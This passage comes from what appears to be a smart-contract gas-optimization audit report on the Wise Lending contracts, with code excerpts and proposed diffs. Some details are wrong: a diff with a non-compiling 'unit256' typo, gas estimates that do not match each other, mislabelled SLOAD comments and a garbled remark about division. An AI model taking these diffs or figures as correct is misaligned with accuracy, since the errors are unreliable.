In the `FeeManager.increaseIncentiveA()` function as shown below checks should be implemented to avoid reading and writing to state if the `_value` argument is zero this is because in scenarios where `_value` is `0` the statement `incentiveUSD[incentiveOwnerA] += _value` would not in any way change the value of `incentiveUSD[incentiveOwnerA]` since it is being incremented by `0`. This means that in scenarios where `_value_` is `0` the statement `incentiveUSD[incentiveOwnerA] += _value` is re-assigning the same value to state; i.e. there is no state change.

```solidity
file: contracts/FeeManager/FeeManager.sol

214:    function increaseIncentiveA(
215:        uint256 _value
216:    )
217:        external
218:        onlyIncentiveMaster
219:    {
220:        incentiveUSD[incentiveOwnerA] += _value;   // @audit implement zero checks
221:
222:        emit IncentiveIncreasedA(
223:            _value,
224:            block.timestamp
225:        );
226:    }
```

```diff
diff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol
index f176113..4515083 100644
--- a/contracts/FeeManager/FeeManager.sol
+++ b/contracts/FeeManager/FeeManager.sol
@@ -24,6 +24,7 @@ import "./FeeManagerHelper.sol";

 contract FeeManager is FeeManagerHelper {

+    error ZeroValue();
     constructor(
         address _master,
         address _aaveAddress,
@@ -217,6 +218,9 @@ contract FeeManager is FeeManagerHelper {
         external
         onlyIncentiveMaster
     {
+        if(_value == 0) {
+            revert ZeroValue();
+        }
         incentiveUSD[incentiveOwnerA] += _value;
```

Estimated gas saved: 50000 gas units.

**Instance 2:**

Refactor `FeeManager.increaseIncentiveB()` to avoid reading or writing to state if `_value` is `0`.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L238

In the `FeeManager.increaseIncentiveB()` function as shown below checks should be implemented to avoid reading and writing to state if the `_value` argument is zero this is because in scenarios where `_value` is `0` the statement `incentiveUSD[incentiveOwnerB] += _value` would not in any way change the value of `incentiveUSD[incentiveOwnerB]` since it is being incremented by `0`. This means that in scenarios where `_value` is `0` the statement `incentiveUSD[incentiveOwnerB] += _value` is re-assigning the same value to state; i.e. there is no state change.

```solidity
file: contracts/FeeManager/FeeManager.sol

232:    function increaseIncentiveB(
233:        uint256 _value
234:    )
235:        external
236:        onlyIncentiveMaster
237:    {
238:        incentiveUSD[incentiveOwnerB] += _value;   // @audit implement zero checks
239:
240:        emit IncentiveIncreasedB(
241:            _value,
242:            block.timestamp
243:        );
244:    }
```

```diff
diff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol
index f176113..79f4dc6 100644
--- a/contracts/FeeManager/FeeManager.sol
+++ b/contracts/FeeManager/FeeManager.sol
@@ -24,6 +24,7 @@ import "./FeeManagerHelper.sol";

 contract FeeManager is FeeManagerHelper {

+    error ZeroValue();
     constructor(
         address _master,
         address _aaveAddress,
@@ -234,7 +235,10 @@ contract FeeManager is FeeManagerHelper {
     )
         external
         onlyIncentiveMaster
-    {
+    {
+        if(_value == 0) {
+            revert ZeroValue();
+        }
         incentiveUSD[incentiveOwnerB] += _value;

         emit IncentiveIncreasedB(
```

Estimated gas saved: 5000 gas units.

## [G-03] Refactor the following function to reduce number of `SLOAD`

**Instance 1:**

Refactor the `WiseLending._healthStateCheck()` function such that the number of storage reads is reduced.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-#L90

We can make the `WiseLending._healthStateCheck()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `powerFarmCheck` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored.

```solidity
file: contracts/WiseLending.sol

77:    function _healthStateCheck(
78:        uint256 _nftId
79:    )
80:        private
81:    {
82:        _checkHealthState(
83:            _nftId,
84:            powerFarmCheck   //@audit 1st powerFarmCheck SLOAD
85:        );
86:
87:        if (powerFarmCheck == true) {       //@audit 2nd powerFarmCheck SLOAD
88:            powerFarmCheck = false;
89:        }
90:    }
```

```diff
diff --git a/contracts/WiseLending.sol b/contracts/WiseLending.sol
index 045678d..a35c653 100644
--- a/contracts/WiseLending.sol
+++ b/contracts/WiseLending.sol
@@ -79,12 +79,13 @@ contract WiseLending is PoolManager {
     )
         private
     {
+        bool _powerFarmCheck = powerFarmCheck;
         _checkHealthState(
             _nftId,
-            powerFarmCheck
+            _powerFarmCheck
         );

-        if (powerFarmCheck == true) {
+        if (_powerFarmCheck == true) {
             powerFarmCheck = false;
         }
     }
```

Estimated gas saved: 97 gas units.

**Instance 2:**

Refactor the `PendlePowerFarmToken.addCompoundRewards()` function such that the number of storage reads is reduced.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L502-#L524

We can make the `PendlePowerFarmToken.addCompoundRewards()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `PENDLE_POWER_FARM_CONTROLLER` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol

502:    function addCompoundRewards(
503:        uint256 _amount
504:    )
505:        external
506:        syncSupply
507:    {
508:        if (_amount == 0) {
509:            revert ZeroAmount();
510:        }
511:
512:        totalLpAssetsToDistribute += _amount;
513:
514:        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {   // @audit 1st PENDLE_POWER_FARM_CONTROLLER SLOAD
515:            return;
516:        }
517:
518:        _safeTransferFrom(
519:            UNDERLYING_PENDLE_MARKET,
520:            msg.sender,
521:            PENDLE_POWER_FARM_CONTROLLER,      // @audit 1st PENDLE_POWER_FARM_CONTROLLER SLOAD
522:            _amount
523:        );
524:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
index 9f7bb58..2f13a79 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
@@ -510,15 +510,15 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {
         }

         totalLpAssetsToDistribute += _amount;
-
-        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {
+        address _PENDLE_POWER_FARM_CONTROLLER = PENDLE_POWER_FARM_CONTROLLER;
+        if (msg.sender == _PENDLE_POWER_FARM_CONTROLLER) {
             return;
         }

         _safeTransferFrom(
             UNDERLYING_PENDLE_MARKET,
             msg.sender,
-            PENDLE_POWER_FARM_CONTROLLER,
+            _PENDLE_POWER_FARM_CONTROLLER,
             _amount
         );
     }
```

Estimated gas saved: 97 gas units.

**Instance 3:**

Refactor the `PendlePowerFarmToken.withdrawExactShares()` function such that the number of storage reads is reduced.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L608-#L645

We can make the `PendlePowerFarmToken.withdrawExactShares()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `underlyingLpAssetsCurrent` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol

608:    function withdrawExactShares(
609:        uint256 _shares
610:    )
611:        external
612:        syncSupply
613:        returns (uint256)
614:    {
615:        if (_shares == 0) {
616:            revert ZeroAmount();
617:        }
618:
619:        if (_shares > balanceOf(msg.sender)) {
620:            revert InsufficientShares();
621:        }
622:
623:        uint256 tokenAmount = previewAmountWithdrawShares(
624:            _shares,
625:            underlyingLpAssetsCurrent   // @audit underlyingLpAssetsCurrent 1st SLOAD
626:        );
627:
628:        underlyingLpAssetsCurrent -= tokenAmount;   // @audit underlyingLpAssetsCurrent 2nd SLOAD
629:
630:        _burn(
631:            msg.sender,
632:            _shares
633:        );
634:
635:        if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {
636:            return tokenAmount;
637:        }
638:
639:        _withdrawLp(
640:            msg.sender,
641:            tokenAmount
642:        );
643:
644:        return tokenAmount;
645:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
index 9f7bb58..436d8be 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
@@ -620,12 +620,14 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {
             revert InsufficientShares();
         }

+        uint256 _underlyingLpAssetsCurrent = underlyingLpAssetsCurrent;
+
         uint256 tokenAmount = previewAmountWithdrawShares(
             _shares,
-            underlyingLpAssetsCurrent
+            _underlyingLpAssetsCurrent
         );

-        underlyingLpAssetsCurrent -= tokenAmount;
+        underlyingLpAssetsCurrent = _underlyingLpAssetsCurrent - tokenAmount;

         _burn(
             msg.sender,
```

Estimated gas saved: 97 gas units.

**Instance 4:**

Refactor the `PendlePowerFarmToken.withdrawExactAmount()` function such that the number of storage reads is reduced.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L647-#L680

We can make the `PendlePowerFarmToken.withdrawExactAmount()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `underlyingLpAssetsCurrent` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol

647:    function withdrawExactAmount(
648:        uint256 _underlyingLpAssetAmount
649:    )
650:        external
651:        syncSupply
652:        returns (uint256)
653:    {
654:        if (_underlyingLpAssetAmount == 0) {
655:            revert ZeroAmount();
656:        }
657:
658:        uint256 shares = previewBurnShares(
659:            _underlyingLpAssetAmount,
660:            underlyingLpAssetsCurrent   // @audit underlyingLpAssetsCurrent 1st SLOAD
661:        );
662:
663:        if (shares > balanceOf(msg.sender)) {
664:            revert NotEnoughShares();
665:        }
666:
667:        _burn(
668:            msg.sender,
669:            shares
670:        );
671:
672:        underlyingLpAssetsCurrent -= _underlyingLpAssetAmount; // @audit underlyingLpAssetsCurrent 2nd SLOAD
673:
674:        _withdrawLp(
675:            msg.sender,
676:            _underlyingLpAssetAmount
677:        );
678:
679:        return shares;
680:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
index 9f7bb58..5912c50 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
@@ -655,9 +655,10 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {
             revert ZeroAmount();
         }

+        uint256 _underlyingLpAssetsCurrent = underlyingLpAssetsCurrent;
         uint256 shares = previewBurnShares(
             _underlyingLpAssetAmount,
-            underlyingLpAssetsCurrent
+            _underlyingLpAssetsCurrent
         );

         if (shares > balanceOf(msg.sender)) {
@@ -669,7 +670,7 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {
             shares
         );

-        underlyingLpAssetsCurrent -= _underlyingLpAssetAmount;
+        underlyingLpAssetsCurrent = _underlyingLpAssetsCurrent - _underlyingLpAssetAmount;

         _withdrawLp(
             msg.sender,
```

Estimated gas saved: 97 gas units.

**Instance 5:**

Refactor the `FeeManager.claimOwnershipIncentiveMaster()` function such that the number of storage reads is reduced.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L194-#L208

We can make the `FeeManager.claimOwnershipIncentiveMaster()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `proposedIncentiveMaster` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable also the `proposedIncentiveMaster` was assigned to `incentiveMaster` which is also used in the event `ClaimedOwnershipIncentiveMaster` rather than using `incentiveMaster` in the event we should use the cached stack variable. Implementing this would avoid 2 `SLOAD`(warmaccess) `200` gas units and replace it with cheaper stack reads. The diff below shows how the function should be refactored:

```solidity
file: contracts/FeeManager/FeeManager.sol

194:    function claimOwnershipIncentiveMaster()
195:        external
196:    {
197:        if (msg.sender != proposedIncentiveMaster) { // @audit proposedIncentiveMaster 1st SLOAD
198:            revert NotAllowed();
199:        }
200:
201:        incentiveMaster = proposedIncentiveMaster; // @audit proposedIncentiveMaster 2nd SLOAD
202:        proposedIncentiveMaster = ZERO_ADDRESS;
203:
204:        emit ClaimedOwnershipIncentiveMaster(
205:            incentiveMaster,
206:            block.timestamp
207:        );
208:    }
```

```diff
diff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol
index f176113..1ef0ae7 100644
--- a/contracts/FeeManager/FeeManager.sol
+++ b/contracts/FeeManager/FeeManager.sol
@@ -194,15 +194,16 @@ contract FeeManager is FeeManagerHelper {
     function claimOwnershipIncentiveMaster()
         external
     {
-        if (msg.sender != proposedIncentiveMaster) {
+        address _proposedIncentiveMaster = proposedIncentiveMaster;
+        if (msg.sender != _proposedIncentiveMaster) {
             revert NotAllowed();
         }

-        incentiveMaster = proposedIncentiveMaster;
+        incentiveMaster = _proposedIncentiveMaster;
         proposedIncentiveMaster = ZERO_ADDRESS;

         emit ClaimedOwnershipIncentiveMaster(
-            incentiveMaster,
+            _proposedIncentiveMaster,
             block.timestamp
         );
     }
```

Estimated gas saved: 194 gas units.

**Instance 6:**

Refactor the `WiseOracleHub.getTokensFromUSD()` function such that the number of storage reads is reduced.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L171-#L192

We can make the `WiseOracleHub.getTokensFromUSD()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `_decimalsETH` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:

```solidity
file: contracts/WiseOracleHub/WiseOracleHub.sol

171:    function getTokensFromUSD(
172:        address _tokenAddress,
173:        uint256 _usdValue
174:    )
175:        external
176:        view
177:        returns (uint256)
178:    {
179:        uint8 tokenDecimals = _tokenDecimals[
180:            _tokenAddress
181:        ];
182:
183:        return _decimalsETH < tokenDecimals  // @audit _decimalsETH 1st SLOAD
184:            ? _usdValue
185:                * 10 ** (tokenDecimals - _decimalsETH)    // @audit _decimalsETH 2nd SLOAD
186:                * 10 ** decimals(_tokenAddress)
187:                / latestResolver(_tokenAddress)
188:            : _usdValue
189:                * 10 ** decimals(_tokenAddress)
190:                / latestResolver(_tokenAddress)
191:                / 10 ** (_decimalsETH - tokenDecimals);  // @audit _decimalsETH 2nd SLOAD
192:    }
```

```diff
diff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol
index 12fe0c8..8d08417 100644
--- a/contracts/WiseOracleHub/WiseOracleHub.sol
+++ b/contracts/WiseOracleHub/WiseOracleHub.sol
@@ -179,16 +179,16 @@ contract WiseOracleHub is OracleHelper {
         uint8 tokenDecimals = _tokenDecimals[
             _tokenAddress
         ];
-
-        return _decimalsETH < tokenDecimals
+        uint8 decimalsEth = _decimalsETH;
+        return decimalsEth < tokenDecimals
             ? _usdValue
-                * 10 ** (tokenDecimals - _decimalsETH)
+                * 10 ** (tokenDecimals - decimalsEth)
                 * 10 ** decimals(_tokenAddress)
                 / latestResolver(_tokenAddress)
             : _usdValue
                 * 10 ** decimals(_tokenAddress)
                 / latestResolver(_tokenAddress)
-                / 10 ** (_decimalsETH - tokenDecimals);
+                / 10 ** (decimalsEth - tokenDecimals);
     }

     /**
```

Estimated gas saved: 97 gas units.

**Instance 7:**

Refactor the `WiseOracleHub.getTokensFromETH()` function such that the number of storage reads is reduced.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L327-#L352

We can make the `WiseOracleHub.getTokensFromETH()` function more gas efficient if we reduce the number of state reads in the function. We can do this by caching state variables that are read more than once into stack variables. The `_decimalsETH` variable was read twice in the function we should instead read it once and cache its value into a stack variable then use the stack variable for subsequent reads for the variable. Implementing this would avoid `SLOAD`(warmaccess) `100` gas units and replace it with cheaper stack read. The diff below shows how the function should be refactored:

```solidity
file: contracts/WiseOracleHub/WiseOracleHub.sol

327:    function getTokensFromETH(
328:        address _tokenAddress,
329:        uint256 _ethAmount
330:    )
331:        public
332:        view
333:        returns (uint256)
334:    {
335:        if (_tokenAddress == WETH_ADDRESS) {
336:            return _ethAmount;
337:        }
338:
339:        uint8 tokenDecimals = _tokenDecimals[
340:            _tokenAddress
341:        ];
342:
343:        return _decimalsETH < tokenDecimals       // @audit _decimalsETH 1st SLOAD
344:            ? _ethAmount
345:                * 10 ** (tokenDecimals - _decimalsETH)        // @audit _decimalsETH 2nd SLOAD
346:                * 10 ** decimals(_tokenAddress)
347:                / latestResolver(_tokenAddress)
348:            : _ethAmount
349:                * 10 ** decimals(_tokenAddress)
350:                / latestResolver(_tokenAddress)
351:                / 10 ** (_decimalsETH - tokenDecimals);   // @audit _decimalsETH 3rd SLOAD
352:    }
```

```diff
diff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol
index 12fe0c8..78004fe 100644
--- a/contracts/WiseOracleHub/WiseOracleHub.sol
+++ b/contracts/WiseOracleHub/WiseOracleHub.sol
@@ -339,16 +339,16 @@ contract WiseOracleHub is OracleHelper {
         uint8 tokenDecimals = _tokenDecimals[
             _tokenAddress
         ];
-
-        return _decimalsETH < tokenDecimals
+        uint8 decimalsEth = _decimalsETH;
+        return decimalsEth < tokenDecimals
             ? _ethAmount
-                * 10 ** (tokenDecimals - _decimalsETH)
+                * 10 ** (tokenDecimals - decimalsEth)
                 * 10 ** decimals(_tokenAddress)
                 / latestResolver(_tokenAddress)
             : _ethAmount
                 * 10 ** decimals(_tokenAddress)
                 / latestResolver(_tokenAddress)
-                / 10 ** (_decimalsETH - tokenDecimals);
+                / 10 ** (decimalsEth - tokenDecimals);
     }

     /**
```

Estimated gas saved: 97 gas units.

## [G-04] Unnecessary copy of storage struct to memory in the `OracleHelper` contract

The `OracleHelper` contract has multiple instances where a complete struct is being copied to memory to end up using only one of its attributes. The contract should be refactored such that only the required attribute is read from storage and cached into stack variable.

**Instance 1:**

Refactor `OracleHelper._addAggregator()` function to avoid copying the storage struct `uniTwapPoolInfo[  _tokenAddress]` into memory struct variable `uniTwapPoolInfoStruct`.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/OracleHelper.sol#L49-#L51

We could save up to 2.1k gas units if we read the `Oracle` attribute of the storage struct `uniTwapPoolInfo[  _tokenAddress]` directly rather than having to copy the storage struct in to a memory struct variable before accessing the member.

```solidity
file: contracts/WiseOracleHub/OracleHelper.sol

32:    function _addAggregator(
33:        address _tokenAddress
34:    )
35:        internal
36:    {
37:        IAggregator tokenAggregator = IAggregator(
38:            priceFeed[_tokenAddress].aggregator()
39:        );
40:
41:        if (tokenAggregatorFromTokenAddress[_tokenAddress] > ZERO_AGGREGATOR) {
42:            revert AggregatorAlreadySet();
43:        }
44:
45:        if (_checkFunctionExistence(address(tokenAggregator)) == false) {
46:            revert FunctionDoesntExist();
47:        }
48:
49:        UniTwapPoolInfo memory uniTwapPoolInfoStruct = uniTwapPoolInfo[  
50:            _tokenAddress
51:        ];
52:
53:        if (uniTwapPoolInfoStruct.oracle > ZERO_ADDRESS) {
54:            revert AggregatorNotNecessary();
55:        }
56:
57:        tokenAggregatorFromTokenAddress[_tokenAddress] = tokenAggregator;
58:    }
```

```diff
diff --git a/contracts/WiseOracleHub/OracleHelper.sol b/contracts/WiseOracleHub/OracleHelper.sol  
index 687b6f1..d3fb824 100644                                                                     
--- a/contracts/WiseOracleHub/OracleHelper.sol                                                    
+++ b/contracts/WiseOracleHub/OracleHelper.sol                                                    
@@ -46,11 +46,7 @@ abstract contract OracleHelper is Declarations {                               
             revert FunctionDoesntExist();                                                        
         }                                                                                        

-        UniTwapPoolInfo memory uniTwapPoolInfoStruct = uniTwapPoolInfo[                          
-            _tokenAddress                                                                        
-        ];                                                                                       
-                                                                                                 
-        if (uniTwapPoolInfoStruct.oracle > ZERO_ADDRESS) {                                       
+        if (uniTwapPoolInfo[_tokenAddress].oracle > ZERO_ADDRESS) {                              
             revert AggregatorNotNecessary();                                                     
         }                                                                                        
```

Estimated gas saved: 2100 gas units.

**Instance 2:**

Refactor `OracleHelper._validateAnswer()` function to avoid copying the storage struct `uniTwapPoolInfo[  _tokenAddress]` into memory struct variable `uniTwapPoolInfoStruct`.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/OracleHelper.sol#L138-#L140

We could save up to 2.1k gas units if we read the `oracle` attribute of the storage struct `uniTwapPoolInfo[  _tokenAddress]` directly rather than having to copy the storage struct in to a memory struct variable before accessing the member.

```solidity
file: contracts/WiseOracleHub/OracleHelper.sol

131:    function _validateAnswer(
132:        address _tokenAddress
133:    )
134:        internal
135:        view
136:        returns (uint256)
137:    {
138:        UniTwapPoolInfo memory uniTwapPoolInfoStruct = uniTwapPoolInfo[
139:            _tokenAddress
140:        ];
141:
142:        uint256 fetchTwapValue;
143:
144:        if (uniTwapPoolInfoStruct.oracle > ZERO_ADDRESS) {
145:            fetchTwapValue = latestResolverTwap(
146:                _tokenAddress
147:            );
148:        }
.
.
.
174:    }
```
```diff
diff --git a/contracts/WiseOracleHub/OracleHelper.sol b/contracts/WiseOracleHub/OracleHelper.sol
index 687b6f1..9200896 100644
--- a/contracts/WiseOracleHub/OracleHelper.sol
+++ b/contracts/WiseOracleHub/OracleHelper.sol
@@ -135,13 +135,10 @@ abstract contract OracleHelper is Declarations {
         view
         returns (uint256)
     {
-        UniTwapPoolInfo memory uniTwapPoolInfoStruct = uniTwapPoolInfo[
-            _tokenAddress
-        ];

         uint256 fetchTwapValue;

-        if (uniTwapPoolInfoStruct.oracle > ZERO_ADDRESS) {
+        if (uniTwapPoolInfo[_tokenAddress].oracle > ZERO_ADDRESS) {
             fetchTwapValue = latestResolverTwap(
                 _tokenAddress
             );
```

Estimated gas saved: 2100 gas units.

## [G-05] Redundant state variable getters

Getters for public state variables are automatically generated by the solidity compiler so there is no need to code them manually as this increases deployment cost.

**Instance 1:**

Make `positionLendTokenData` mapping variable `private` or `internal` since a getter function was defined for it.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLendingDeclaration.sol#L270

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLowLevelHelper.sol#L144-#L153

The solidity compiler would automatically create a getter function for the `positionLendTokenData` mapping since it is declared as a `public` variable but a getter function `getPositionLendingTokenByIndex()` was also declared in the `WiseLowLevelHelper` contract for the same variable; thereby, making it two getter functions for the same variable in the contract. We could rectify this issue by making the `positionLendTokenData` variable private or internal (if the variable is to be inherited). The diff below shows how the code could be refactored:

```solidity
file: contracts/WiseLendingDeclaration.sol

270:    mapping(uint256 => address[]) public positionLendTokenData;

file: contracts/WiseLowLevelHelper.sol

144:    function getPositionLendingTokenByIndex(
145:        uint256 _nftId,
146:        uint256 _index
147:    )
148:        public
149:        view
150:        returns (address)
151:    {
152:        return positionLendTokenData[_nftId][_index];
153:    }
```

```diff
diff --git a/contracts/WiseLendingDeclaration.sol b/contracts/WiseLendingDeclaration.sol
index 05a0e01..d1ba624 100644
--- a/contracts/WiseLendingDeclaration.sol
+++ b/contracts/WiseLendingDeclaration.sol
@@ -267,7 +267,7 @@ contract WiseLendingDeclaration is
     mapping(address => uint256) internal bufferIncrease;
     mapping(address => uint256) public maxDepositValueToken;

-    mapping(uint256 => address[]) public positionLendTokenData;
+    mapping(uint256 => address[]) internal positionLendTokenData;
     mapping(uint256 => address[]) public positionBorrowTokenData;

     mapping(uint256 => mapping(address => uint256)) public userBorrowShares;
```

**Instance 2:**

Make `poolTokenAddresses` array variable `private` or `internal` since a getter function was defined for it.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/DeclarationsFeeManager.sol#L123

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L884-#L892

The solidity compiler would automatically create a getter function for the `poolTokenAddresses` array since it is declared as a `public` variable but a getter function `getPoolTokenAdressesByIndex()` was also declared in the `FeeManager` contract for the same variable thereby making it two getter functions for the same variable in the contract. We could rectify this issue by making the `poolTokenAddresses` variable private or internal (if the variable is to be inherited). The diff below shows how the code could be refactored:

```solidity
file: contracts/FeeManager/DeclarationsFeeManager.sol

123:    address[] public poolTokenAddresses;

file: contracts/FeeManager/FeeManager.sol

884:    function getPoolTokenAdressesByIndex(
885:        uint256 _index
886:    )
887:        external
888:        view
889:        returns (address)
890:    {
891:        return poolTokenAddresses[_index];
892:    }
```

```diff
diff --git a/contracts/FeeManager/DeclarationsFeeManager.sol b/contracts/FeeManager/DeclarationsFeeManager.sol
index ba7eed7..e10f9be 100644
--- a/contracts/FeeManager/DeclarationsFeeManager.sol
+++ b/contracts/FeeManager/DeclarationsFeeManager.sol
@@ -120,7 +120,7 @@ contract DeclarationsFeeManager is FeeManagerEvents, OwnableMaster {
     uint256 public paybackIncentive;

     // Array of pool tokens in wiseLending
-    address[] public poolTokenAddresses;
+    address[] internal poolTokenAddresses;

     // Address of incentive master
     address public incentiveMaster;
```

## [G-06]  Using `storage` instead of `memory` for struct saves gas

**Instance 1:**

Make `borrowData` a storage variable

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L1099

We could make the `_increaseResonanceFactor()` function more gas efficient if we declare the `borrowData` struct variable as `storage` rather than `memory`. In implementing this we would avoid having to copy all the members of `BorrowRatesEntry` struct from storage to memory which would incur a Gcoldsload (2100 gas) for each storage slot read which totals to 10500 gas units. Declaring the `borrowData` struct variable as a `storage` variable would only cost 100 gas units (Gwarmsload) which totals to 300 gas for the members read in the function (`deltaPole`, `pole` and `maxPole`) and members read more than once in the function are cached in stack variable and the stack variable used subsequently. The diff below shows how the code should be refactored: 

```solidity
file: contracts/MainHelper.sol

1094:    function _increaseResonanceFactor(
1095:        address _poolToken
1096:    )
1097:        private
1098:    {
1099:        BorrowRatesEntry memory borrowData = borrowRatesData[
1100:            _poolToken
1101:        ];
1102:
1103:        uint256 delta = borrowData.deltaPole
1104:            * (block.timestamp - timestampsPoolData[_poolToken].timeStampScaling);
1105:
1106:        uint256 sum = delta
1107:            + borrowData.pole;
1108:
1109:        uint256 setValue = sum > borrowData.maxPole
1110:            ? borrowData.maxPole
1111:            : sum;
1112:
1113:        _setPole(
1114:            _poolToken,
1115:            setValue
1116:        );
1117:    }
```

```diff
diff --git a/contracts/MainHelper.sol b/contracts/MainHelper.sol
index 46854bc..a1b4d0f 100644
--- a/contracts/MainHelper.sol
+++ b/contracts/MainHelper.sol
@@ -1096,7 +1096,7 @@ abstract contract MainHelper is WiseLowLevelHelper {
     )
         private
     {
-        BorrowRatesEntry memory borrowData = borrowRatesData[
+        BorrowRatesEntry storage borrowData = borrowRatesData[
             _poolToken
         ];

@@ -1106,8 +1106,9 @@ abstract contract MainHelper is WiseLowLevelHelper {
         uint256 sum = delta
             + borrowData.pole;

-        uint256 setValue = sum > borrowData.maxPole
-            ? borrowData.maxPole
+        unit256 _maxPole = borrowData.maxPole;
+        uint256 setValue = sum > _maxPole
+            ? _maxPole
             : sum;
```

Estimated gas saved: 10200 gas units.

## [G-07] Unchecked Divisions

Divisions which do not divide by `-X` cannot overflow or overflow so such operations can be unchecked to save gas.

**Instance 1:**

Unchecked uint divisions in `WiseSecurity.overallLendingAPY()` function to reduce its gas cost.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L491-#L492

```solidity
file: contracts/WiseSecurity/WiseSecurity.sol

442:    function overallLendingAPY(
443:        uint256 _nftId
444:    )
445:        external
446:        view
447:        returns (uint256)
448:    {
449:        uint256 len = WISE_LENDING.getPositionLendingTokenLength(
450:            _nftId
451:        );
.
.
.
491:        return weightedRate     //@audit can be unchecked
492:            / overallETH;
493:    }
```

```diff
diff --git a/contracts/WiseSecurity/WiseSecurity.sol b/contracts/WiseSecurity/WiseSecurity.sol
index d2cfb24..a101048 100644
--- a/contracts/WiseSecurity/WiseSecurity.sol
+++ b/contracts/WiseSecurity/WiseSecurity.sol
@@ -487,9 +487,11 @@ contract WiseSecurity is WiseSecurityHelper, ApprovalHelper {
                 ++i;
             }
         }
-
-        return weightedRate
+        unchecked {
+            return weightedRate
             / overallETH;
+        }
+
     }
```

Estimated gas saved: 45 gas units.

**Instance 2:**

Unchecked uint divisions in `WiseSecurity.overallBorrowAPY()` function to reduce its gas cost.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L548-#L549

```solidity
file: WiseSecurity/WiseSecurity.sol

499:    function overallBorrowAPY(
500:        uint256 _nftId
501:    )
502:        external
